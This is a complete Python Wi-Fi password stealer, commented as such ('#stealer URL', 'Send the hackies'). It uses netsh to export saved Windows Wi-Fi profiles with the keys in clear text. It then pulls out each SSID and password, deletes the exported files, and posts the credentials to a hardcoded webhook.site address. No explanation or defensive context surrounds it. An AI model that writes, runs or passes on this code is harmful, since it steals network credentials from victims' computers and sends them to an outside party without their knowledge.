from importlib.metadata import files
from importlib.resources import path
from logging import root
import os
import subprocess
import os
import sys
import requests
import xml.etree.ElementTree as ET

#stealer URL
url= 'https://webhook.site/a15001d6-055d-459d-a3f4-b0ac688be093'

#Lists & Dictionaries
wifi_files=[]
payload= {"SSID":[], "Password":[]}

#For the Windows command
command=subprocess.run(["netsh","wlan","export","profile","key=clear"], capture_output=True).stdout.decode()
#For grabbing the current directory
path=os.getcwd()
#Append Wi-fi XML files to wifi_files list
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)
#Parse wifi XML files 
for file in wifi_files:
    tree= ET.parse(file)
    root=tree.getroot()
    SSID=root[0].text
    password= root[4][0][1][2].text
    payload["SSID"].append(SSID)
    payload["Password"].append(password)
    os.remove(file)    
            
#Send the hackies..hehe
payload_str =" & ".join("%s=%s" %(k,v) for k,v in payload.items())
r=requests.post(url,params='format=json', data=payload_str)                         